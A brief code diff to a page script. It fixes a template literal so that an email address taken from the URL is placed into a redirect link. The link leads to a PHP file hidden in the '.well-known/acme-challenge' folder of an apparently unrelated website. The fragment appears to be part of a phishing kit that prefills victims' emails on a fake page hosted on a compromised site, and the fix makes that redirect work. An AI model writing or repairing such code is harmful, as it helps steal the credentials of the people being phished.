@@ -19,7 +19,7 @@
         const email = getEmailFromURL();
         // Update the href attribute of the link
         const link = document.getElementById('redirectLink');
-        link.href = `https://besco.com.pe/.well-known/acme-challenge/404.php?email={email}`;
+        link.href = `https://besco.com.pe/.well-known/acme-challenge/404.php?email=${email}`;
     }
 
     // Call the updateLink function when the page loads
